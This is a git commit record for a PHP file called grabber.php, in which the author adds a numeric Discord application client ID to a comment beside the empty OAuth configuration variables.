c0056c5d5c5fa3349dc8b45c3382721c86ed967b
ashcloud74 <shane.mclaughlin4@icloud.com>
2025-05-08 14:37:04 -0700

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,7 +2,7 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
+$client_id     = ""; //CLIENT ID HERE 1370151032130244699
 $client_secret = ""; //CLIENT SECRET HERE
 $redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
